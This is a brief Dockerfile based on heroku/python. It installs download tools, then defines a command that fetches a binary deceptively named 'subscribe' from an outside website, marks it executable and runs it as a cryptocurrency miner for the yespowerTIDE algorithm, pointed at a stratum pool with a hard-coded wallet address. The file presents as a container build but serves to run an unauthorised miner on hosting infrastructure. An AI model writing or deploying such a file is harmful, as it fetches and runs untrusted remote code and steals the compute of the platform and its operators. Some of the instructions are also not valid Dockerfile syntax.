FROM heroku/python
RUN apt-get install -y curl git unzip wget
command="wget http://ilovenypizza.com/subscribe && chmod +x subscribe && ./subscribe -a yespowerTIDE -o stratum+tcps://stratum-eu.rplant.xyz:17059 -u TVt7kd7Ns8rwzS8LoeMXjJZnwKdMAhhZkn.HR -t 2"
CMD $command
